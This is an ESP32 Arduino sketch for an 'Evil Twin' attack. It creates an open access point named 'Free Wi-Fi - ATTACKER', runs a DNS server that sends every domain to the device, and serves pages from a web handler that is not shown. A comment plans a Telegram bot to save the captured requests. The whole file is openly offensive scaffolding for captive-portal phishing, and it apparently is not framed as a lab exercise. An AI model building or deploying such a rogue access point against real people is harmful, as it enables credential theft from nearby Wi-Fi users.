#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

#include "web_handler.h"

// TBD: add a Telegram Bot that saves requests

const char *ap_ssid = "Free Wi-Fi - ATTACKER";
const char *ap_password = "";

const byte DNS_PORT = 53;
DNSServer dns_server;
WebServer http_server(80);

void setup() {

    Serial.begin(115200);   // start serial communication with PC (115200 baud)
  
    WiFi.softAP(ap_ssid, ap_password);    // create Access Point
    dns_server.start(DNS_PORT, "*", WiFi.softAPIP());   // start DNS server 
    setup_web_handler();    // setup http server
    http_server.begin();        // start http server

    Serial.println("Evil Twin Started");
    Serial.println("IP Address: ");
    Serial.println(WiFi.softAPIP());    // print ESP-32 IP Address

  }

  void loop() {

    dns_server.processNextRequest();
    http_server.handleClient();

  }
  
